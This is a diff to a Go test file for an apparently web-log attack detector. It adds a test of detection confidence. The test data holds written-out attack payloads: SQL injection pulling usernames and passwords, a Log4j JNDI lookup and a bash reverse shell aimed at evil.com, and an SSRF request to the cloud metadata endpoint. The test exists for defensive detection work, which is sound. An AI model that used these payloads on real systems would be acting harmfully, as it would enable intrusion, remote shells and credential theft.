@@ -854,7 +854,7 @@ func TestPatternUniqueness(t *testing.T) {
 	for i, p := range compilePatterns() {
 		key := p.re.String()
 		if prev, ok := seen[key]; ok {
-			t.Errorf("duplicate pattern: %q (desc %q) at index %d duplicates %q at index ?", key, p.desc, i, prev)
+			t.Errorf("duplicate pattern: %q (desc %q, confidence %d) at index %d duplicates %q at index ?", key, p.desc, p.confidence, i, prev)
 			dupes++
 		}
 		seen[key] = p.desc
@@ -863,7 +863,7 @@ func TestPatternUniqueness(t *testing.T) {
 	for i, p := range rawPatterns {
 		key := p.re.String()
 		if prev, ok := seen[key]; ok {
-			t.Errorf("duplicate raw pattern: %q (desc %q) at index %d duplicates %q", key, p.desc, i, prev)
+			t.Errorf("duplicate raw pattern: %q (desc %q, confidence %d) at index %d duplicates %q", key, p.desc, p.confidence, i, prev)
 			dupes++
 		}
 		seen[key] = p.desc
@@ -952,6 +952,81 @@ func TestDetectAllPolyglot(t *testing.T) {
 				if !seen[want] {
 					t.Errorf("expected detection type %s not found in results: %+v", want, dets)
 				}
+			}
+		})
+	}
+}
+
+func TestDetectionConfidence(t *testing.T) {
+	detector := NewDetector()
+
+	tests := []struct {
+		name            string
+		uri             string
+		ua              string
+		wantType        DetectionType
+		wantMinConf     int
+		wantMaxConf     int
+	}{
+		{
+			name:        "UNION SELECT — high confidence",
+			uri:         "/?id=1%20UNION%20SELECT%20username,password%20FROM%20users",
+			ua:          "Mozilla/5.0",
+			wantType:    DetSQLInjection,
+			wantMinConf: 9,
+			wantMaxConf: 10,
+		},
+		{
+			name:        "Encoded chars — low confidence",
+			uri:         "/page?x=%3Cdiv%3E",
+			ua:          "Mozilla/5.0",
+			wantType:    DetXSS,
+			wantMinConf: 1,
+			wantMaxConf: 5,
+		},
+		{
+			name:        "JNDI lookup — max confidence",
+			uri:         "/login?x=${jndi:ldap://evil.com/a}",
+			ua:          "Mozilla/5.0",
+			wantType:    DetLog4j,
+			wantMinConf: 9,
+			wantMaxConf: 10,
+		},
+		{
+			name:        "Reverse shell — max confidence",
+			uri:         "/page?cmd=bash+-i+>/dev/tcp/evil.com/443",
+			ua:          "Mozilla/5.0",
+			wantType:    DetRCE,
+			wantMinConf: 9,
+			wantMaxConf: 10,
+		},
+		{
+			name:        "Cloud metadata — max confidence",
+			uri:         "/proxy?url=http://169.254.169.254/latest/meta-data/",
+			ua:          "Mozilla/5.0",
+			wantType:    DetSSRF,
+			wantMinConf: 9,
+			wantMaxConf: 10,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			entry := &types.LogEntry{
+				RemoteIP:  "1.2.3.4",
+				URI:       tt.uri,
+				UserAgent: tt.ua,
+				Status:    200,
+			}
+			det := detector.Detect(entry)
+			if det == nil {
+				t.Fatalf("expected detection, got nil")
+			}
+			if det.Type != tt.wantType {
+				t.Errorf("expected type %s, got %s", tt.wantType, det.Type)
+			}
+			if det.Confidence < tt.wantMinConf || det.Confidence > tt.wantMaxConf {
+				t.Errorf("expected confidence %d-%d, got %d", tt.wantMinConf, tt.wantMaxConf, det.Confidence)
 			}
 		})
 	}
